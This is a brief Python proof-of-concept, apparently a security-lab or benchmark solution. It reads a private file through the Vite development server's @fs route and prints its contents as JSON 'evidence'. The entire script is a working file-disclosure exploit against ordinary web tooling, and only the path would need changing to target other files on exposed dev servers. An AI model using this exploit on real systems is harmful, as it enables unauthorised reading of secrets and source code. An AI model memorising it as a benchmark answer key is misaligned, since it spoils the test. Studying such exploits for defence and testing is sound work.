#!/usr/bin/env python3
"""Read a private file through the Vite development server's @fs route."""

import json
import os
import urllib.error
import urllib.request


FLAG_PATH = "/tmp/vite001-secret"


def read_file(target_url: str) -> tuple[int, str]:
    url = f"{target_url.rstrip('/')}/@fs/tmp/vite001-secret"
    try:
        with urllib.request.urlopen(url, timeout=20) as response:
            return response.status, response.read().decode("utf-8")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8")


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    status, content = read_file(target_url)
    if status != 200:
        raise RuntimeError(f"Private file request returned HTTP {status}")
    print(json.dumps({
        "evidence_payload": {"flag_path": FLAG_PATH, "content": content},
        "request_status": status,
    }))


if __name__ == "__main__":
    main()
